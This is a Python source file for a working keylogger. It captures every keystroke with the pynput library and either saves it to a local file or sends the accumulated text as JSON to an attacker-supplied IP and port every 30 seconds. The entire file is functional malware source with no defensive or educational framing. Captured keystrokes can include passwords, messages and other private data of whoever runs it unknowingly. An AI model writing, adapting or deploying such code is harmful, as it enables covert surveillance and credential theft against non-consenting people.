import argparse
from pynput import keyboard
import re
import sys
import requests
import json
import threading

content = ""
uppercase = False
ip_address = ""
port = ""
time_interval = 30 # seconds
server_mode = False
file_mode = False

def send_content_to_server():
    if not server_mode:
        return
    
    try:
        payload = json.dumps({"content" : content})
        requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_content_to_server)
        timer.start()
    except:
        print("Couldn't complete request!")

def on_press(key):
    global content, uppercase

    try:
        if key == keyboard.Key.enter:
            content += "\n"
        elif key == keyboard.Key.tab:
            content += "\t"
        elif key == keyboard.Key.space:
            content += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        elif key == keyboard.Key.caps_lock:
            uppercase = not uppercase
        elif key == keyboard.Key.backspace:
            content = content[:-1]
        else:
            char = str(key).strip("'")
            content += char.upper() if uppercase else char
    except Exception as e:
        print("Error occurred: " + str(e))

    if file_mode:
        with open("storage.txt", "w") as file:
            file.write(content)

def validate_arguments(mode, ip, port) -> str:
    mode_pattern = re.compile(r'server|file')
    port_pattern = re.compile(r'^[0-9]{1,5}$')
    ip_pattern = re.compile(r'^(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.'
                        r'(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.'
                        r'(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\.'
                        r'(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])$')

    mode_matches = mode_pattern.fullmatch(mode)
    ip_matches = ip_pattern.fullmatch(ip)
    port_matches = port_pattern.fullmatch(port) and 0 <= int(port) <= 65535

    if mode_matches and ip_matches and port_matches:
        return (True, "")
    else:
        error_message = ""
        if not mode_matches:
            error_message = f"Invalid mode: {mode}! (file/server)"
        if len(error_message) > 0:
                error_message += "\n"
        if not ip_matches:
            error_message = f"Invalid IP address: {ip}"
        if len(error_message) > 0:
                error_message += "\n"
        if not port_matches:
            error_message += f"Invalid port number: {port}"
        
    return (False, error_message)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process IP and Port for the server.')
    parser.add_argument('--mode', type=str, required=True, help='Server or File')
    parser.add_argument('--ip', type=str, required=True, help='IP address of the server')
    parser.add_argument('--port', type=str, required=True, help='Port of the server')

    args = parser.parse_args()

    validateSuccess, validateMessage = validate_arguments(args.mode, args.ip, args.port)

    if not validateSuccess:
        print(validateMessage)
        sys.exit()
    
    if args.mode == "server":
        server_mode = True
    else:
        file_mode = True
    
    ip_address = args.ip
    port = args.port
    
    if file_mode:
        with open("storage.txt", "r") as file:
            content = file.read()

with keyboard.Listener(on_press=on_press) as listener:
    if server_mode:
        send_content_to_server()
    listener.join()
